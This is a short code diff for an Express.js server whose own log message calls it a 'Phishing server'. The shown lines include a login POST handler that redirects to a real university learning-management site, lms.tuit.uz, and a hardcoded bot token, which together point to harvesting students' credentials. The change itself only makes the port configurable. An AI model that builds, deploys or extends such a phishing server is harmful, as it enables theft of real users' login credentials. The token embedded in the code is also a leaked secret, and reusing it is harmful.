@@ -2,7 +2,6 @@ const express = require('express');
 const path = require('path');
 const fs = require('fs');
 const app = express();
-const PORT = 3000;
 const token = '8576588701:AAF8vKw-BkgvNURxXuk8xYhpNylBbQt6md8';
 
 app.use(express.urlencoded({ extended: true }));
@@ -30,9 +29,10 @@ app.post('/login', (req, res) => {
 
     res.redirect('https://lms.tuit.uz/dashboard/news');
 });
-
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Phishing server ishlamoqda → http://localhost:${PORT}`);
     console.log('Ctrl+C bilan to‘xtating');
 });
+
 
